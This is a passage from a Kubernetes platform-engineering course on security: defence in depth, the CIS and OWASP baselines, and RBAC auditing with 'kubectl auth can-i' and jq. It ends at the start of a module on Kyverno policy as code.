# 08 · Security and Policy Engineering

> **Project Applicability:** Active in Project — Policy-as-code with **Kyverno** (`deploy/policies/`) and **mTLS 1.3** for Spoke-to-Hub OTLP ingestion are active; supply-chain signing and runtime security are reference extensions.

> By now you can build, ship, and operate workloads on Kubernetes. This phase makes
> them **safe by default**. Security is not a gate you bolt on before go-live; it is
> a set of structural properties the platform provides so that every team is secure
> *without having to be a security expert*. You'll move security left and down —
> into the paved road, the admission controller, and the supply chain — so the safe
> way is the easy way.

> Baselines for this phase: the
> [OWASP Kubernetes Top 10](https://owasp.org/www-project-kubernetes-top-10/) and the
> [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes). Keep
> both open — we map lessons and labs back to them throughout.

## Why Security and Policy Engineering?

Every prior phase quietly assumed a trustworthy environment. That assumption does
not survive contact with production. Credentials leak, dependencies get
compromised, images are swapped, a pod gets popped, an over-broad `ClusterRoleBinding`
becomes a cluster takeover. The question is never *"will something go wrong?"* but
*"when it does, how far can it spread?"*

Platform engineering answers that question **structurally**. Instead of asking every
product team to remember to drop capabilities, scan images, rotate secrets, and write
network policies, the platform makes those properties the default — enforced by
machinery, visible in reports, and impossible to forget. That is the difference
between a *checklist* (which decays the moment someone is in a hurry) and a
*guardrail* (which holds regardless).

This phase gives you the defence-in-depth model and the tools to implement it:

- **Own the baseline.** The platform team defines and enforces the security baseline;
 product teams *consume* it. Security becomes a capability, not a committee.
- **Assume breach.** Design as if an attacker is already inside. Least privilege,
 short-lived credentials, segmented networks, and runtime detection limit the blast
 radius of any single failure.
- **Shift security into the paved road.** Admission policy, signed images, and synced
 secrets make the secure path the *default* path — adopted by choice, not decree.
- **Make it provable.** "We think it's locked down" is not security. You'll produce
 evidence: benchmark scores, `auth can-i` tables, policy reports, SBOMs, signatures,
 and audit logs.

You have already met several of these ideas. hardened the container
(non-root, read-only, dropped capabilities); introduced RBAC; Project 1
shipped Pod Security Admission and a hardened golden path; Project 2 added a
signed-image Kyverno policy and the External Secrets Operator. This phase deepens all
of them into a coherent, enforced whole.

## The seven layers of defence in depth

No single control is sufficient. Real Kubernetes security is a stack of independent
layers, each of which an attacker must defeat and each of which contains the damage
if the layer above it fails:

```text
 ┌─────────────────────────────────────────────────────────────┐
 7 ▸ │ Runtime security detect & respond (Falco, PSS) │ 
 ├─────────────────────────────────────────────────────────────┤
 6 ▸ │ Network policies segment east-west traffic (L3–L7) │ 
 ├─────────────────────────────────────────────────────────────┤
 5 ▸ │ Workload security non-root, drop caps, PSS Restricted │
 ├─────────────────────────────────────────────────────────────┤
 4 ▸ │ Namespace isolation RBAC, quotas, least privilege │
 + RBAC
 ├─────────────────────────────────────────────────────────────┤
 3 ▸ │ Node & OS hardening CIS node checks, minimal host │ 
 ├─────────────────────────────────────────────────────────────┤
 2 ▸ │ Cluster API access authn/authz to the API server │
 ├─────────────────────────────────────────────────────────────┤
 1 ▸ │ Cloud IAM & perimeter identity, VPC, firewall, no public │ IaC
 └─────────────────────────────────────────────────────────────┘
 Assume each layer WILL be breached. The next one limits the blast radius.
```

Supply-chain and secret controls cut *across* these layers: they
decide what is even allowed to run and what it is allowed to know. Zero trust is the organizing philosophy that ties them together — never trust,
always verify, least privilege everywhere.

## Security Principles for Platform Teams

> Security on Kubernetes is not a product you buy or a scan you run the day before
> launch. It is a **layered, structural property** the platform provides so that every
> team is secure without having to be a security expert. This module gives you the
> mental model — defence in depth, assume breach, least privilege — and the two
> industry baselines (CIS Benchmark, OWASP Kubernetes Top 10) you'll measure against
> for the rest of the phase.

**You'll need:** · Container Security,
 · RBAC, and a working
`kubectl` + [kind](https://kind.sigs.k8s.io/).

### Learning objectives

By the end of this module you will be able to:

- Explain **defence in depth** as seven independent layers and reason about blast
 radius when any one fails.
- Articulate why the **platform team owns the security baseline** and product teams
 consume it.
- Describe the **CIS Kubernetes Benchmark** and the **OWASP Kubernetes Top 10**, and
 say what each is for.
- Apply **assume-breach** and **least-privilege** thinking to a platform design.
- Score a cluster against a benchmark and turn findings into a prioritized backlog.

---

### 1. Concept

#### Security is structural, not a checklist

Every earlier phase assumed a trustworthy environment. Production does not grant that
assumption. A single leaked token, a compromised dependency, or one over-broad
`ClusterRoleBinding` can become a cluster takeover. The honest question is never
*"will something go wrong?"* but *"when it does, how far can it spread?"*

There are two ways to answer that. One is a **checklist**: a wiki page that tells every
team to run as non-root, scan images, drop capabilities, and write network policies.
Checklists decay the instant someone is in a hurry, and they put the security burden
on people who were hired to write business logic. The other is a **guardrail**: the
platform makes those properties the default, enforced by machinery, visible in
reports, impossible to forget. Platform engineering chooses guardrails. Security
becomes a *capability the platform provides*, not a committee you escalate to.

This reframes the platform team's job. You are not the team that *reviews* everyone
else's security; you are the team that makes the secure path the **easy, default**
path — the paved road that ships hardened by construction, admits only
compliant workloads, and hands out short-lived credentials. Teams get security by adopting the golden path, not by remembering a list.

#### Defence in depth: seven layers

The layered model is shown in Kubernetes security layers.

No single control is sufficient, because every control can fail. Defence in depth
stacks **independent** layers so that an attacker must defeat each one, and so that a
breach of any layer is *contained* by the next (the layers are drawn top-down in the
phase overview). Read each boundary as a question: *if the attacker is
already past the layers below, what stops them here, and what do they gain if they
win?*

1. **Cloud IAM & perimeter.** A private control plane and tight cloud IAM make a
 stolen `kubeconfig` useless from the internet (you built this in IaC).
2. **Cluster API access.** Every request is authenticated then authorized; weak authn
 or broad authz (cluster-admin for CI) collapses every layer below it.
3. **Node & OS hardening.** A minimal, patched node with a locked-down kubelet limits
 what a container escape can reach.
4. **Namespace isolation + RBAC.** Least privilege within the tenancy boundary caps the
 blast radius of a stolen ServiceAccount token.
5. **Workload security.** Non-root, read-only root filesystem, dropped capabilities —
 applied cluster-wide via Pod Security Standards and policy (13.3).
6. **Network policies.** Default-deny east-west traffic so a compromised pod cannot
 reach every other service.
7. **Runtime security.** Assume something still gets through: watch *behaviour* —
 unexpected shells, new binaries, odd connections — and respond.

Two concerns cut *across* all seven layers: the **supply chain**
decides what is even allowed to run, and **secret management** decides
what a workload is allowed to know. Zero trust is the philosophy that
unifies the whole stack.

#### Assume breach, least privilege, verify everything

Three principles drive every decision in this phase:

- **Assume breach.** Design as though an attacker already has a foothold. This flips
 the default from "allow unless blocked" to "deny unless explicitly needed," and it
 makes containment — not just prevention — a first-class goal.
- **Least privilege.** Every identity (human, workload, pipeline) gets the minimum
 permissions it needs and nothing more. The cost of a compromised credential is
 bounded by what that credential could do.
- **Verify everything.** Trust is earned per request, not granted by network location.
 Signed images, authenticated service-to-service calls, and audited access replace
 "it's inside the cluster, so it's fine."

#### Two baselines: CIS Benchmark and OWASP Kubernetes Top 10

You don't have to invent "what secure means." Two community baselines define it, and
this phase maps to both:

- **CIS Kubernetes Benchmark** — a detailed, prescriptive checklist of configuration
 controls for the control plane, etcd, kubelet, and policies, each with an audit and
 remediation. It answers *"is this cluster configured to a known-good standard?"* and
 tools like **kube-bench** score a cluster against it automatically. Think of it as
 the hardening spec for layers 2–5.
- **OWASP Kubernetes Top 10** — a risk-ranked list of the *most common and impactful*
 ways Kubernetes deployments get compromised. It answers *"what actually goes wrong
 in the real world, and am I exposed?"* Highlights you'll recognize across this phase:

 ```text
 K01 Insecure workload configurations → (PSS, policy)
 K02 Supply chain vulnerabilities → (SBOM, signing)
 K03 Overly permissive RBAC → (RBAC audit)
 K04 Lack of centralized policy enforcement → (Kyverno)
 K05 Inadequate logging & monitoring 
 K06 Broken authentication 
 K07 Missing network segmentation controls
 K08 Secrets management failures
 K09 Misconfigured cluster components → (CIS/kube-bench)
 K10 Outdated & vulnerable components → (scanning)
 ```

Use the Benchmark to harden configuration and the Top 10 to prioritize *risk*. They
are complementary: one is "are the knobs set correctly," the other is "where does the
damage actually come from."

---

### 2. Why it matters for platform engineering

- **Leverage.** A baseline defined once by the platform team secures the Nth team for
 free. Fixing a class of misconfiguration in the golden path fixes it everywhere —
 something per-team review can never match.
- **Blast-radius math is the job.** When (not if) a credential leaks or a pod is
 popped, the difference between a shrug and an incident is whether the layers below
 contained it. You design for containment on purpose.
- **Audits become evidence, not panic.** When security is structural, compliance is a
 report you generate (benchmark score, policy report, `auth can-i` table), not a fire
 drill — and regulated industries pay a premium for exactly that.
- **It removes a false trade-off.** "Move fast *or* be secure" is a symptom of bolt-on
 security; a paved road hardened by construction lets teams move fast *because* the
 safe path is the easy one. Deferring security "until later" (an anti-pattern this
 course names) just builds a platform teams route around.

---

### 3. Mental model

Hold two pictures in your head.

**1. The castle, not the gate.** Perimeter-only security is a single wall: breach it
and you own everything inside. Defence in depth is a castle — moat, wall, keep,
guards — where each boundary assumes the previous one may have fallen.

```text
Perimeter only (brittle) Defence in depth (resilient)
──────────────────────── ────────────────────────────
 ┌───────────────┐ ( ( ( ( ( ( ( ( ( ( ( (
 │ firewall │ breach → all moat · wall · keep · guard
 │ EVERYTHING │ is lost breach one → the next still
 │ inside is │ contains you; no single
 │ trusted │ failure is fatal
 └───────────────┘
```

**2. Blast radius is the metric.** For any control, ask two questions: if this layer
is breached, *what can the attacker reach next* (lateral movement) and *what can they
do with it* (privilege)? Security work is shrinking both answers at every layer —
least-privilege RBAC, admission policy, segmented networks, short-lived secrets, signed
images, and runtime detection are each one of those two answers getting smaller.

---

### 4. Minimal implementation

Before any tooling, do the cheapest, highest-leverage security activity there is: a
**five-minute threat model** of a workload, mapped to the seven layers. You are
answering "where could this go wrong, and what contains it?"

Take a typical service — a public API pod that reads a database password from a
Kubernetes Secret and runs as root because nobody changed the default:

```text
Asset: customer API + its database credentials
Threat → which layer should contain it → is it contained today?

 Stolen image pulled from a typo-squatted registry
 → L2 (what's admitted) + supply chain → NO (no signing/policy yet)
 Container runs as root, writable filesystem
 → L5 (workload security) → NO (default pod spec)
 Compromised pod reads every other service
 → L6 (network policy) → NO (default-allow networking)
 ServiceAccount token can list Secrets cluster-wide
 → L4 (RBAC) → NO (over-broad default)
 Attacker opens a shell and runs a crypto-miner
 → L7 (runtime detection) → NO (nothing is watching)
```

Five "NO"s, and we haven't installed anything. That list *is* the phase backlog: PSS +
policy (L5), network policy (L6), RBAC audit (L4), signing (supply chain), Falco (L7).
A threat model turns "security" from a vague anxiety into a prioritized to-do list.

Now make it quantitative. The smallest honest "how bad is it?" check is to see how
many `cluster-admin` grants exist — the single most common real-world finding:

```bash
# Who holds the keys to the kingdom? (should be a tiny, known list)
kubectl get clusterrolebindings -o json \
 | jq -r '.items[]
 | select(.roleRef.name=="cluster-admin")
 |.subjects[]? | "\(.kind)/\(.namespace // "-")/\(.name)"'
```

If that prints more than a handful of entries — or any ServiceAccount you don't
recognize — you have found OWASP **K03 (overly permissive RBAC)** in under a minute.
The lab scales this up with **kube-bench** and a full OWASP self-assessment.

---

### 5. Hands-on lab

You'll stand up a kind cluster, score it with **kube-bench** against the CIS
Kubernetes Benchmark, and walk the **OWASP Kubernetes Top 10** as a structured
self-assessment — producing exactly the kind of baseline report a platform team
publishes before it starts enforcing anything.

➡️ **Start the lab**

---

### 6. Production considerations

- **Benchmarks are a floor, not a ceiling.** Managed control planes (GKE/EKS/AKS)
 already satisfy many control-plane CIS controls — focus on the node, policy, and
 RBAC controls you actually own. A green score is necessary, not sufficient; it says
 nothing about your application logic.
- **Continuous, not one-shot.** Run kube-bench and config scanners (kubescape, Trivy's
 `k8s` mode) on a schedule and in CI, not once before an audit. Yesterday's hardened
 cluster is today's finding after one `kubectl edit`.
- **Own the baseline as code.** Keep it in Git as policies, Terraform, and golden-path
 defaults — reviewable, versioned, rolled out like any product change — not as tribal
 knowledge in a runbook.
- **Prioritize by blast radius, not CVSS count.** One over-broad RBAC grant or an
 exposed dashboard outranks a hundred low-severity base-image findings. Triage by
 "what does this let an attacker *do*" — exactly what the OWASP list encodes.
- **Make shared responsibility explicit.** Write down which layers the cloud, the
 platform, and the product team each own. Most breaches live in the gaps nobody
 thought they owned.
- **Security has SLOs too.** Track mean time to patch a critical CVE, % of workloads on
 the hardened baseline, and % of clusters passing the benchmark. What you don't
 measure, you don't improve.

---

### 7. Common mistakes

- **Perimeter-only security ("we have a firewall").** Treating the network edge as the
 whole defence; once inside, everything is trusted and one breach is total. *Fix:*
 assume breach and build inner layers (RBAC, PSS, network policy, runtime) that each
 contain the one above.
- **Security as a final gate.** A review or scan bolted on right before launch finds
 problems too late to fix cheaply and makes security the team that says "no." *Fix:*
 shift it into the paved road so the default is compliant.
- **Chasing the scanner score.** Driving a CIS/CVE number to green while ignoring an
 over-permissive RBAC model or an exposed Secret. *Fix:* prioritize by blast radius
 (OWASP Top 10), not by list length.
- **The platform mandates but doesn't provide.** Requiring non-root and image scanning
 without giving teams a hardened base image, a policy that enforces it, and docs.
 *Fix:* provide the capability, don't just publish the requirement.
- **Treating the benchmark as done-once.** Passing the audit and never re-checking as
 nodes, versions, and manifests drift. *Fix:* run it continuously in CI and on a
 schedule.
- **No named owner per layer.** Assuming "the cloud handles it" or "the app team
 handles it" with no explicit mapping. *Fix:* a written shared-responsibility matrix.

---

### 8. Assessment

**Knowledge checks**

1. Name the seven layers of defence in depth, and give one control at each.
2. What is the difference in *purpose* between the CIS Kubernetes Benchmark and the
 OWASP Kubernetes Top 10?
3. What does "assume breach" change about how you set defaults?
4. Why does the platform team *owning* the baseline produce more security than
 *reviewing* every team's work?

**Concept exercise**

> Explain defence in depth to a skeptical engineer **without using the words
> "firewall," "scanner," or any product name.** Make the blast-radius argument land.

**Trade-off / debugging exercise**

> A team's kube-bench report is 95% green, yet a penetration test took over the
> cluster in an hour by stealing one CI pipeline's token. Explain how both facts can
> be true at once, which OWASP risk this maps to, and what you'd fix first. Then
> describe how you'd stop the *class* of problem, not just this instance.

<details>
<summary>Discussion (open after you've answered)</summary>

- **Layers:** (1) cloud IAM/perimeter, (2) cluster API access, (3) node/OS hardening,
 (4) namespace isolation + RBAC, (5) workload security/PSS, (6) network policies,
 (7) runtime security — e.g. private endpoint, least-privilege RBAC, patched nodes,
 quotas, non-root containers, default-deny NetworkPolicy, Falco.
- **Purpose:** the Benchmark is a prescriptive *configuration* standard ("are the knobs
 set right?"); the Top 10 is a risk-ranked list of *how breaches actually happen*
 ("where's the real exposure?"). Use the first to harden, the second to prioritize.
- **Assume breach:** you default to deny, minimize privilege, segment the network, and
 invest in containment and detection — not just prevention — because you plan for the
 attacker already being inside.
- **Own vs review:** fixing the golden path once secures every current and future team
 structurally; review is per-change, doesn't scale, becomes a bottleneck, and relies
 on humans remembering under deadline pressure.
- **Trade-off:** a green benchmark measures *configuration*, not the *RBAC/identity*
 blast radius. The CI token had far too much power — OWASP **K03 (overly permissive
 RBAC)**, amplified by weak **K06 (authentication)**. Fix first: scope the CI
 ServiceAccount to least privilege and rotate the token. Stop the class:
 make least-privilege CI identity a template/policy so no pipeline can be granted
 cluster-admin, and audit RBAC continuously.

</details>

---

### 9. Further reading

- OWASP — [Kubernetes Top 10](https://owasp.org/www-project-kubernetes-top-10/)
- CIS — [Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes)
- Aqua Security — [kube-bench](https://github.com/aquasecurity/kube-bench)
- Kubernetes — [Security overview and checklist](https://kubernetes.io/docs/concepts/security/security-checklist/)
- NSA/CISA — [Kubernetes Hardening Guide](https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF)
- Kubernetes — [The 4C's of Cloud Native security](https://kubernetes.io/docs/concepts/security/overview/)

---


_Previous:_ overview
· _Next:_ Kubernetes RBAC Deep Dive →

---

## Kubernetes RBAC Deep Dive

> taught you to *write* a Role and bind it. Production asks a harder question: across
> hundreds of bindings, **who can actually do what — and how do you prove it?** This module turns RBAC
> into something you **audit, compose, and time-box** — so least privilege becomes a guardrail the
> platform maintains, not a rule each team has to remember.

**You'll need:** · RBAC (Roles,
bindings, `auth can-i`), plus a working `kubectl` + [kind](https://kind.sigs.k8s.io/).

### Learning objectives

By the end of this module you will be able to:

- Distinguish **ServiceAccounts** (identities you manage) from **Users/Groups** (vouched for by an
 external authenticator), and explain where each comes from.
- Reveal any subject's **effective permissions** with impersonation and
 `kubectl auth can-i --list --as=…`.
- Compose capability with **aggregated ClusterRoles** instead of copy-pasting rules.
- **Audit** a cluster for over-broad grants — wildcards, `cluster-admin` holders, and cluster-wide
 ServiceAccounts — and map findings to OWASP **K03**.
- Reason about **just-in-time access**, **cross-namespace** grants, **CI/CD identity**, and
 **API server audit logging**.

---

### 1. Concept

#### Subjects revisited: the identities you manage

RBAC has three subject kinds, and the distinction matters more than let on:

- **Users** and **Groups** are *strings an authenticator vouches for*. Kubernetes has no user table; it
 trusts whatever proves identity at the API server's door — a client certificate's `CN`/`O`, or in
 production an **OIDC** provider returning username and group claims from your SSO. You never "create" a
 User; you configure the authenticator and *bind* the names it emits.
- **ServiceAccounts** are real, namespaced objects — machine identities for workloads and automation,
 which you create, rotate, and audit.

So you **bind groups for humans** (access follows SSO; a leaver loses cluster access automatically) and
**manage ServiceAccounts for machines** — the identities you own outright, where most least-privilege
work lives.

#### Reading effective permissions: ask the authorizer

The trap at scale: **a subject's real permissions are the union of every binding that names it** —
directly, through a Group, or through an *aggregated* ClusterRole. No single object shows the total, so
reading one Role tells you almost nothing. Instead, **ask the authorizer**: impersonation (`--as`,
`--as-group`) runs the exact check Kubernetes would, with no context switch and no stolen credentials:

```bash
# Everything a CI ServiceAccount can do, as the API server sees it:
kubectl auth can-i --list \
 --as=system:serviceaccount:team-apps:cicd-deployer -n team-apps
```

`--list` enumerates the whole effective rule set; a plain `kubectl auth can-i <verb> <resource> --as=…`
answers one yes/no. This is how you *verify* a grant instead of hoping — the most important RBAC skill
this module adds.

#### Aggregated ClusterRoles: compose capability, don't copy it

Listing every rule in one object rots: each new capability means editing a giant role and re-reviewing
all of it. **Aggregation** fixes this — a ClusterRole with an `aggregationRule` owns *no rules of its
own*; the control plane unions in every ClusterRole whose labels match:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
 name: platform-viewer
aggregationRule:
 clusterRoleSelectors:
 - matchLabels:
 rbac.example.com/aggregate-to-viewer: "true"
rules: [] # intentionally empty — the controller aggregates matching roles
```

Add capability by adding a small, labeled role — no edit to `platform-viewer`, no re-review of the whole:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
 name: view-pods
 labels:
 rbac.example.com/aggregate-to-viewer: "true"
rules:
 - apiGroups: [""]
 resources: ["pods", "services"]
 verbs: ["get", "list", "watch"]
```

Label a role → it joins in seconds; remove the label → it leaves. Kubernetes builds its own
`view`/`edit`/`admin` roles this way — the pattern a platform uses to publish a growing **capability
catalog**: review each small role once, reuse it everywhere.

#### Auditing RBAC: hunting the over-broad grant

RBAC *drifts permissive* — every "just one more permission" is a ratchet that turns one way. Three
findings cause most real incidents, and together they are OWASP **K03 — overly permissive RBAC**:

- **Wildcards** — `verbs`, `resources`, or `apiGroups: ["*"]`; a wildcard silently absorbs every resource
 type added later. Enumerate instead.
- **`cluster-admin` holders** — anything bound to it owns the cluster; the list should be tiny and known.
- **Cluster-wide ServiceAccounts** — a machine identity bound by a *ClusterRoleBinding* acts in every
 namespace, so a leaked token is a cluster-wide incident.

Find all three with `kubectl -o json | jq`. Tools go further: **`kubectl-who-can`** (a krew plugin
answering "who can `<verb> <resource>`?"), **KubiScan** (risky roles and tokens), and **rbac-tool**
(visualize, lint, generate least-privilege roles). The lab builds the `jq` audit by hand first — a tool
you can't reproduce with `jq` is one you can't trust.

#### Cross-namespace access: narrow by default

A workload in namespace A legitimately needs a ConfigMap in namespace B (shared config, a platform
controller, a cross-team contract). Two ways, and the difference *is* the lesson:

- **ClusterRole + RoleBinding in the target namespace** — define the permission set once as a ClusterRole
 (a *reusable template*, not a cluster-wide grant), then bind it with a RoleBinding **in namespace B**.
 The subject gets those rights **only in B** — the narrow, correct answer.
- **ClusterRoleBinding** — grants the role in **every** namespace. Use it only for a genuinely
 cluster-wide need (a monitoring reader), never for a one-namespace problem.

Rule of thumb: *a ClusterRole is a reusable noun; a ClusterRoleBinding is a cluster-wide verb.*

#### Just-in-time access: no standing privilege

The most dangerous permission is the one that sits unused until an attacker finds it. **Standing
privilege** — permanent `cluster-admin`, an always-live break-glass account — is blast radius waiting to
happen. **Just-in-time (JIT)** access grants elevation only when needed, scoped and **time-boxed**, then
revokes it automatically:

- **Short-lived bindings** — create a RoleBinding on approval, delete it on a timer (a controller that
 reaps bindings older than *N* minutes).
- **Access-request tooling** — a workflow that mints the binding after approval and records who/why.
- **Break-glass** — a sealed, heavily-audited emergency path that alerts on use.

The goal is **zero standing privileges**: nothing carries power it isn't using right now — a pillar of
zero trust, built out in.

#### Watching the authorizer: API server audit logging

RBAC decides *whether* a request is allowed; **audit logging** records *that it happened*. Point the API
server at an `--audit-policy-file`, which picks a level per rule:

- **`None`** — don't log (health checks, chatty watches).
- **`Metadata`** — who, verb, resource, allowed/denied — no bodies; the sane default.
- **`Request`** — metadata **plus the request body**.
- **`RequestResponse`** — request and response bodies; reserve for sensitive resources (RBAC objects,
 Secrets).

Then **ship the logs** off the node into 's pipeline — one nobody queries is just disk usage.
This is how a `cluster-admin` grant at 03:00 becomes an alert, not an archaeology project.

---

### 2. Why it matters for platform engineering

- **You own the machine identities.** Every pipeline, operator, and controller runs as a ServiceAccount
 *you* create — and over-privileged automation is the top real-world RBAC risk.
- **Least privilege must be provable.** `kubectl auth can-i --list --as=…` turns a claim into evidence on
 demand.
- **Composition scales; copy-paste doesn't.** Aggregated ClusterRoles publish a catalog teams opt into,
 not monolith roles re-reviewed on every change.
- **Audit is a product feature.** "Who can read Secrets in prod?" is one command against a structural RBAC
 model, a spreadsheet-and-a-prayer against a bolt-on one.
- **Blast-radius math is the point.** Tight, namespace-scoped, time-boxed grants decide whether a leaked
 token means "one namespace" or "whole cluster" — and assume-breach says it *will* leak.

---

### 3. Mental model

**First: effective permissions are a union you must query, not read.**

```text
 Effective permissions = UNION of every binding that names the subject
 ─────────────────────────────────────────────────────────────────────
 ServiceAccount: team-apps/cicd-deployer
 │
 ├─ RoleBinding (ns team-apps) ─► Role: deploy-manager
 │ get,list,create,update,patch deployments, services
 │
 ├─ RoleBinding (ns team-apps) ─► ClusterRole: configmap-reader
 │ get,list,watch configmaps
 │
 └─ Group system:serviceaccounts ─► any binding to that group
 inherited — easy to forget, easy to over-grant

 No single object shows the total. Ask the authorizer:
 kubectl auth can-i --list --as=system:serviceaccount:team-apps:cicd-deployer
```

**Second: every grant is a blast radius** — the same capability costs different amounts by *scope*:

```text
 One leaked ServiceAccount token
 ──────────────────────────────────────────────────────────────
 Narrow (RoleBinding, 1 ns) Broad (ClusterRoleBinding, *)
 token → team-apps only token → every namespace
 ├ manage its deployments ├ read ALL secrets (creds, tokens)
 └ cannot read secrets ├ create clusterrolebindings
 cannot leave the namespace └ self-escalate to cluster-admin
 ⇒ incident = one namespace ⇒ incident = whole cluster
```

Design every grant with the question: *if this subject is compromised, what can it reach, and
do there?* All RBAC work is shrinking both answers.

---

### 4. Minimal implementation

The smallest honest RBAC audit needs no new tools — just the authorizer and `jq`. Start with the question
that matters most: **what can this subject actually do?**

```bash
# Reveal a subject's full effective permissions (no context switch, no creds):
kubectl auth can-i --list \
 --as=system:serviceaccount:kube-system:namespace-controller
```

A short list is health; `* *` (every verb on every resource) is a finding. Now sweep the whole cluster
for the roles that grant that wildcard:

```bash
# The smallest wildcard-hunter: every ClusterRole granting * verbs, resources, or apiGroups.
kubectl get clusterroles -o json \
 | jq -r '.items[]
 | select(.rules[]? | (((.verbs // []) | index("*")) != null)
 or (((.resources // []) | index("*")) != null)
 or (((.apiGroups // []) | index("*")) != null))
 |.metadata.name' | sort -u
```

That one pipe names every ClusterRole holding the keys to expanding permissions. Cross-reference the hits
against who they're *bound* to (the lab's `rbac-audit.sh` does this) and you've found OWASP **K03** in
minutes, without installing anything. Reach for `kubectl-who-can` or KubiScan to go faster.

---

### 5. Hands-on lab

You'll stand up a kind cluster, audit it for wildcard roles, `cluster-admin` holders, and cluster-wide
ServiceAccounts with a `jq` script, answer "who can do X?" with `who-can` (or a pure-`kubectl` fallback),
grow an **aggregated ClusterRole** by adding one labeled role, and build a least-privilege **CI/CD
ServiceAccount** you prove — granted *and* denied — with `kubectl auth can-i --as=…`.

➡️ **Start the lab**

---

### 6. Production considerations

- **Bind groups, not users.** Wire the API server to OIDC and bind *groups* from SSO; joiners and leavers
 are handled by the IdP, not hand-edited certs.
- **Continuously audit.** Run the wildcard / `cluster-admin` / cluster-wide-SA sweep in CI and on a
 schedule — RBAC drifts permissive, and that drift *is* the finding.
- **Make capabilities a catalog.** Publish aggregated ClusterRoles (`app-team-admin`, `platform-viewer`)
 teams opt into, instead of approving bespoke roles per request.
- **No standing privilege for humans.** Default human access to read-only; elevate through time-boxed JIT
 with an audit trail, and keep break-glass sealed and alerting.
- **Turn on audit logging from day one.** `Metadata` for reads, `RequestResponse` for RBAC/Secrets, shipped
 to retro-fitting it after an incident is too late.
- **CI identity is least-privilege by construction.** Per-namespace ServiceAccount, short-lived tokens,
 never `cluster-admin` — the pattern Project 1 (`04-platform-project-01`)
 and Project 2 (`09-platform-project-02`) wire into delivery.

---

### 7. Common mistakes

- **Reading one Role and calling it the permission set** — effective access is the union of *all* bindings
 (direct, group, aggregated). *Fix:* verify with `kubectl auth can-i --list --as=<subject>`.
- **Wildcards for convenience** — `["*"]` "to make it work" grants far more than intended and grows as new
 APIs ship. *Fix:* enumerate exact verbs and resources; audit for `*`.
- **`cluster-admin` for a one-namespace job** — the fastest way to unblock CI, and to lose the cluster.
 *Fix:* a namespace-scoped Role + RoleBinding, or a ClusterRole bound by a RoleBinding in the one target
 namespace.
- **Standing privilege "just in case"** — permanent elevation nobody uses is pure blast radius. *Fix:*
 time-boxed JIT bindings and zero standing privileges.
- **Hand-maintained monolith roles** — one giant shared role re-reviews everything on each change and tempts
 over-granting. *Fix:* aggregated ClusterRoles composed from small, labeled roles.
- **RBAC without audit logging** — you see *who can* act but have no record of who *did*. *Fix:* enable API
 server audit logging and ship it to observability.

---

### 8. Assessment

**Knowledge checks**

1. Where do Users and Groups come from in Kubernetes, and why are ServiceAccounts the subject type a
 platform team actually manages?
2. How do you reveal the *complete* effective permissions of a subject, and why can't you read them off any
 single Role or binding?
3. What problem do aggregated ClusterRoles solve, and how does
 `aggregationRule.clusterRoleSelectors.matchLabels` grow the aggregate?
4. To let a workload in namespace `a` read ConfigMaps in namespace `b`, which objects do you create — and
 why is a ClusterRoleBinding the wrong tool?
5. Name the API server audit levels and say what each records. Which would you use for Secrets?

**Concept exercise**

> Explain to a new platform engineer how to discover *every* action a leaked machine-identity token would
> let an attacker take — **without using the words "RBAC," "impersonation," or any command or tool name.**
> Make the "permissions are a union, not a line in one file" idea land.

**Trade-off / debugging exercise**

> A workload's identity, checked with `auth can-i --list`, shows `* *` — full access. The owning team swears
> they only bound it to a small, read-only Role in their namespace. Give at least two ways it could still
> have `*`, how you'd locate the grant, and what structural change stops this class of problem recurring.

<details>
<summary>Discussion (open after you've answered)</summary>

- **Q1:** They're strings an authenticator (client certs or OIDC/SSO) vouches for — Kubernetes has no user
 table, so you bind the names it emits. ServiceAccounts are real namespaced objects you create, rotate,
 and audit, so least-privilege work concentrates there.
- **Q2:** Ask the authorizer — `kubectl auth can-i --list --as=<subject>` (plus `--as-group`). Effective
 access is the union of every binding naming the subject directly, via a Group, or via aggregation; no one
 object holds the total.
- **Q3:** They compose a big role from small labeled ones: the empty-ruled role's `matchLabels` unions in
 every ClusterRole carrying the label. Add or remove capability by adding or removing a labeled role.
- **Q4:** A ClusterRole **plus a RoleBinding in namespace `b`** — the rights apply *only* in `b`. A
 ClusterRoleBinding would grant them in every namespace.
- **Q5:** `None`, `Metadata` (who/verb/resource/decision), `Request` (adds request body), `RequestResponse`
 (adds response body). Use `RequestResponse` for Secrets and RBAC objects.
- **Trade-off:** `* *` can come from a `cluster-admin`/wildcard ClusterRole bound via a Group the SA
 belongs to (e.g. `system:serviceaccounts`), an aggregated role that pulled in a wildcard labeled role, or
 a stray ClusterRoleBinding. Find it by listing every binding that names the subject or its groups and
 checking each `roleRef` for wildcards. Structural fix: forbid wildcard/`cluster-admin` grants to
 ServiceAccounts in policy, compose via labeled aggregation, and audit continuously.

</details>

---

### 9. Further reading

- Kubernetes — [Using RBAC Authorization](https://kubernetes.io/docs/reference/access-authn-authz/rbac/) (aggregation, default roles)
- Kubernetes — [`kubectl auth can-i`](https://kubernetes.io/docs/reference/kubectl/generated/kubectl_auth/kubectl_auth_can-i/)
- Kubernetes — [Auditing](https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/)
- OWASP — [Kubernetes Top 10 (K03: Overly Permissive RBAC)](https://owasp.org/www-project-kubernetes-top-10/)
- Aqua Security — [kubectl-who-can](https://github.com/aquasecurity/kubectl-who-can)
- CyberArk — [KubiScan](https://github.com/cyberark/KubiScan)

---


_Previous:_ Security Principles for Platform Teams
· _Next:_ Policy as Code with Kyverno →

---

## Policy as Code with Kyverno

> Hardening only helps if every workload actually gets hardened. Asking each team to
> remember `runAsNonRoot`, resource limits, and no `:latest` tags is a checklist that
> decays. **Policy as code** turns those rules into enforced guardrails: a controller
> inspects every admission request and *blocks, mutates, or reports* on it before it
> reaches the cluster. This module uses **Kyverno** to make the security baseline
> structural — the same decision Project 1 recorded in ADR-004.

**You'll need:** · Admission Webhooks,
 · Container Security,
and a working `kubectl` + [kind](https://kind.sigs.k8s.io/).

### Learning objectives

By the end of this module you will be able to:

- Explain **policy as code** and where it sits in the admission pipeline.
- Choose between **Kyverno** and **OPA/Gatekeeper**, and justify the choice.
- Write Kyverno **validate**, **mutate**, and **generate** rules, and know when to use
